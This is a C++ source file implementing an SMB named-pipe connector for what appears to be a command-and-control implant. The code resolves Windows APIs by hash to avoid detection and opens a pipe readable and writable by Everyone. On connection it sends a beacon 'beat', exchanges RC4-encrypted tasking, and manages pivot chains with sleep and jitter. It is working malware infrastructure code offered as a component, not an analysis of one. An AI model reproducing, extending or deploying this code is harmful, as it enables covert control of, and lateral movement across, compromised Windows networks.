#include "ConnectorSMB.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Crypt.h"
#include "utils.h"
#include "Pivotter.h"

void* ConnectorSMB::operator new(size_t sz) 
{
    void* p = MemAllocLocal(sz);
    return p;
}

void ConnectorSMB::operator delete(void* p) noexcept 
{
    MemFreeLocal(&p, sizeof(ConnectorSMB));
}

ConnectorSMB::ConnectorSMB()
{
	this->functions = (SMBFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(SMBFUNC));

	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	this->functions->LocalFree    = ApiWin->LocalFree;
	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	this->functions->GetLastError = ApiWin->GetLastError;
	this->functions->ReadFile     = ApiWin->ReadFile;
	this->functions->WriteFile    = ApiWin->WriteFile;

	this->functions->NtClose = ApiNt->NtClose;

	this->functions->CreateNamedPipeA    = ApiWin->CreateNamedPipeA;
	this->functions->DisconnectNamedPipe = ApiWin->DisconnectNamedPipe;
	this->functions->CancelIo            = ApiWin->CancelIo;

	this->functions->FlushFileBuffers               = (decltype(FlushFileBuffers)*)    GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_FLUSHFILEBUFFERS);
	this->functions->AllocateAndInitializeSid       = (decltype(AllocateAndInitializeSid)*)     GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_ALLOCATEANDINITIALIZESID);
	this->functions->InitializeSecurityDescriptor   = (decltype(InitializeSecurityDescriptor)*) GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_INITIALIZESECURITYDESCRIPTOR);
	this->functions->FreeSid                        = (decltype(FreeSid)*)                      GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_FREESID);
	this->functions->SetEntriesInAclA               = (decltype(SetEntriesInAclA)*)             GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETENTRIESINACLA);
	this->functions->SetSecurityDescriptorDacl      = (decltype(SetSecurityDescriptorDacl)*)    GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETSECURITYDESCRIPTORDACL);

	this->functions->CreateEventA           = ApiWin->CreateEventA;
	this->functions->SetEvent               = ApiWin->SetEvent;
	this->functions->ResetEvent             = ApiWin->ResetEvent;
	this->functions->WaitForMultipleObjects = ApiWin->WaitForMultipleObjects;

	this->functions->ConnectNamedPipe       = (decltype(ConnectNamedPipe)*)    GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_CONNECTNAMEDPIPE);
	this->functions->GetOverlappedResult    = ApiWin->GetOverlappedResult;

	this->hTermEvent      = this->functions->CreateEventA(NULL, TRUE, FALSE, NULL);
	this->ovRead.hEvent   = this->functions->CreateEventA(NULL, TRUE, FALSE, NULL);
	this->hWriteEvent     = this->functions->CreateEventA(NULL, TRUE, FALSE, NULL);
}

BOOL ConnectorSMB::SetProfile(void* profilePtr, BYTE* beatData, ULONG beatDataSize)
{
	ProfileSMB profile = *(ProfileSMB*)profilePtr;

	if (beatData && beatDataSize) {
		this->beat = (BYTE*)MemAllocLocal(beatDataSize);
		if (this->beat) {
			memcpy(this->beat, beatData, beatDataSize);
			this->beatSize = beatDataSize;
		}
	}
	PSID pEveryoneSID = nullptr;
    SID_IDENTIFIER_AUTHORITY pIdentifierAuthority;
    *(DWORD*)pIdentifierAuthority.Value = 0;
    *(WORD*)&pIdentifierAuthority.Value[4] = 256;
    if (!this->functions->AllocateAndInitializeSid(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSID))
        return FALSE;

	PACL pACL = nullptr;
    EXPLICIT_ACCESS pListOfExplicitEntries = { 0 };
    pListOfExplicitEntries.grfAccessPermissions = GENERIC_READ | GENERIC_WRITE;
    pListOfExplicitEntries.grfAccessMode        = SET_ACCESS;
    pListOfExplicitEntries.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    pListOfExplicitEntries.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    pListOfExplicitEntries.Trustee.ptstrName    = (LPTSTR)pEveryoneSID;

    if (this->functions->SetEntriesInAclA(1, &pListOfExplicitEntries, nullptr, &pACL) != ERROR_SUCCESS)
        return FALSE;

    PSECURITY_DESCRIPTOR pSD = this->functions->LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
    if (!pSD || !this->functions->InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION) || !this->functions->SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE)) 
        return FALSE;

	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), pSD, FALSE };
    this->hChannel = this->functions->CreateNamedPipeA((CHAR*) profile.pipename, FILE_FLAG_OVERLAPPED | PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 0x100000, 0x100000, 0, &sa);
    if (this->hChannel == INVALID_HANDLE_VALUE)
        return FALSE;

    this->functions->FreeSid(pEveryoneSID);
    this->functions->LocalFree(pACL);
    this->functions->LocalFree(pSD);

    return TRUE;
}

void ConnectorSMB::SendData(BYTE* data, ULONG data_size)
{
    this->recvSize = 0;

    if (!data || !data_size)
        return;

    OVERLAPPED ovWrite = {};
    ovWrite.hEvent     = this->hWriteEvent;
    DWORD nWritten     = 0;

    this->functions->ResetEvent(this->hWriteEvent);
    if (!this->functions->WriteFile(this->hChannel, &data_size, 4, &nWritten, &ovWrite)) {
        if (this->functions->GetLastError() == ERROR_IO_PENDING)
            this->functions->GetOverlappedResult(this->hChannel, &ovWrite, &nWritten, TRUE);
        else
            return;
    }

    DWORD index = 0;
    while (index < data_size) {
        DWORD chunkSize = data_size - index;
        if (chunkSize > 0x2000)
            chunkSize = 0x2000;

        ovWrite        = {};
        ovWrite.hEvent = this->hWriteEvent;
        nWritten       = 0;
        this->functions->ResetEvent(this->hWriteEvent);

        if (!this->functions->WriteFile(this->hChannel, data + index, chunkSize, &nWritten, &ovWrite)) {
            if (this->functions->GetLastError() == ERROR_IO_PENDING)
                this->functions->GetOverlappedResult(this->hChannel, &ovWrite, &nWritten, TRUE);
            else
                break;
        }
        index += nWritten;
    }
}

void ConnectorSMB::ReadIncoming()
{
    ULONG msgLen = this->rdHeader;
    if (msgLen == 0 || msgLen > 0x1000000) {
        this->connected = FALSE;
        return;
    }

    if (msgLen > this->allocaSize) {
        this->recvData   = (BYTE*) this->functions->LocalReAlloc(this->recvData, msgLen, 0);
        this->allocaSize = msgLen;
    }

    ULONG idx = 0;
    while (idx < msgLen) {
        this->functions->ResetEvent(this->ovRead.hEvent);
        DWORD nRead = 0;
        if (!this->functions->ReadFile(this->hChannel, this->recvData + idx, msgLen - idx, &nRead, &this->ovRead)) {
            DWORD err = this->functions->GetLastError();
            if (err == ERROR_IO_PENDING) {
                if (!this->functions->GetOverlappedResult(this->hChannel, &this->ovRead, &nRead, TRUE)) {
                    this->recvSize = -1;
                    return;
                }
            } else {
                this->recvSize = -1;
                return;
            }
        }
        idx += nRead;
    }
    this->recvSize = (int)idx;
}

BYTE* ConnectorSMB::RecvData()
{
    return this->recvData;
}

int ConnectorSMB::RecvSize()
{
	return this->recvSize;
}

void ConnectorSMB::RecvClear()
{
    if ( this->recvData && this->allocaSize )
        memset(this->recvData, 0, this->recvSize);
    this->recvSize = 0;
}

void ConnectorSMB::Listen()
{
    while ( !this->functions->ConnectNamedPipe(this->hChannel, nullptr) && this->functions->GetLastError() != ERROR_PIPE_CONNECTED);

    this->recvData = (BYTE*) this->functions->LocalAlloc(LPTR, 0x100000);
    this->allocaSize = 0x100000;
}

BOOL ConnectorSMB::WaitForConnection()
{
    this->Listen();
    this->SendData(this->beat, this->beatSize);
    this->connected = TRUE;
    return TRUE;
}

BOOL ConnectorSMB::IsConnected()
{
    return this->connected;
}

void ConnectorSMB::Disconnect()
{
    this->DisconnectInternal();
    this->connected = FALSE;
}

void ConnectorSMB::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
    this->recvSize = 0;

    if (plainData && plainSize > 0) {
        EncryptRC4(plainData, plainSize, sessionKey, 16);
        this->SendData(plainData, plainSize);
    }

    if (!this->rdPending)
        return;

    DWORD nRead = 0;
    if (!this->functions->GetOverlappedResult(this->hChannel, &this->ovRead, &nRead, FALSE)) {
        DWORD err = this->functions->GetLastError();
        if (err == ERROR_IO_INCOMPLETE)
            return;
        this->connected = FALSE;
        this->rdPending = FALSE;
        return;
    }
    this->rdPending = FALSE;

    if (nRead != 4) {
        this->connected = FALSE;
        return;
    }

    this->ReadIncoming();

    if (this->recvSize < 0) {
        this->connected = FALSE;
        return;
    }

    if (this->recvSize > 0 && this->recvData)
        DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
}

void ConnectorSMB::DisconnectInternal() 
{
    if (this->rdPending) {
        this->functions->CancelIo(this->hChannel);
        DWORD nBytes = 0;
        this->functions->GetOverlappedResult(this->hChannel, &this->ovRead, &nBytes, TRUE);
        this->rdPending = FALSE;
    }

    this->functions->FlushFileBuffers(this->hChannel);
    this->functions->DisconnectNamedPipe(this->hChannel);

    if (this->allocaSize) {
        memset(this->recvData, 0, this->allocaSize);
        this->functions->LocalFree(this->recvData);
        this->recvData = nullptr;
    }
    this->allocaSize = 0;
    this->recvData   = nullptr;
}

void ConnectorSMB::CloseConnector()
{
    if (this->beat && this->beatSize) {
        MemFreeLocal((LPVOID*)&this->beat, this->beatSize);
        this->beat     = nullptr;
        this->beatSize = 0;
    }
    if (this->hTermEvent) {
        this->functions->SetEvent(this->hTermEvent);
        this->functions->NtClose(this->hTermEvent);
        this->hTermEvent = nullptr;
    }
    if (this->ovRead.hEvent) {
        this->functions->NtClose(this->ovRead.hEvent);
        this->ovRead.hEvent = nullptr;
    }
    if (this->hWriteEvent) {
        this->functions->NtClose(this->hWriteEvent);
        this->hWriteEvent = nullptr;
    }
    this->functions->NtClose(this->hChannel);
}

void ConnectorSMB::PostHeaderRead()
{
    if (this->rdPending)
        return;

    this->rdHeader = 0;
    this->functions->ResetEvent(this->ovRead.hEvent);

    DWORD nRead  = 0;
    BOOL  result = this->functions->ReadFile(this->hChannel, &this->rdHeader, 4, &nRead, &this->ovRead);

    if (result) {
        this->functions->SetEvent(this->ovRead.hEvent);
        this->rdPending = TRUE;
    }
    else if (this->functions->GetLastError() == ERROR_IO_PENDING) {
        this->rdPending = TRUE;
    }
    else {
        this->connected = FALSE;
    }
}

void ConnectorSMB::Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput, DWORD pollIntervalMs)
{
    if (!this->connected || !this->hChannel)
        return;

    this->PostHeaderRead();
    if (!this->connected)
        return;

    if (this->pivotter) {
        for (int _i = 0; _i < (int)this->pivotter->pivots.size(); _i++) {
            PivotData* _p = &this->pivotter->pivots[_i];
            if (_p->Type == PIVOT_TYPE_SMB && _p->asyncIO)
                this->pivotter->PostPivotHeaderRead(_p);
        }
    }

    if (hasOutput)
        return;

    HANDLE waitHandles[MAXIMUM_WAIT_OBJECTS];
    DWORD  handleCount = 0;

    const DWORD IDX_PARENT  = handleCount;  waitHandles[handleCount++] = this->ovRead.hEvent;
    const DWORD IDX_TERM    = handleCount;  waitHandles[handleCount++] = this->hTermEvent;
    const DWORD IDX_WAKEUP  = handleCount;
    if (wakeupEvent)
        waitHandles[handleCount++] = wakeupEvent;
    const DWORD IDX_CHILDREN = handleCount;

    if (this->pivotter) {
        for (int _i = 0; _i < (int)this->pivotter->pivots.size(); _i++) {
            PivotData* _p = &this->pivotter->pivots[_i];
            if (_p->Type == PIVOT_TYPE_SMB && _p->asyncIO && _p->asyncIO->rdPending) {
                if (handleCount < MAXIMUM_WAIT_OBJECTS)
                    waitHandles[handleCount++] = _p->asyncIO->ovRead.hEvent;
            }
        }
    }

    DWORD timeout = pollIntervalMs ? pollIntervalMs : INFINITE;

    if (timeout == INFINITE && this->pivotter) {
        for (int _i = 0; _i < (int)this->pivotter->pivots.size(); _i++) {
            if (this->pivotter->pivots[_i].Type == PIVOT_TYPE_TCP) {
                timeout = 10;
                break;
            }
        }
    }

    DWORD result = this->functions->WaitForMultipleObjects(handleCount, waitHandles, FALSE, timeout);

    if (result == WAIT_OBJECT_0 + IDX_TERM) {
        this->connected = FALSE;
    }
    else if (wakeupEvent && result == WAIT_OBJECT_0 + IDX_WAKEUP) {
        this->functions->ResetEvent(wakeupEvent);
    }
}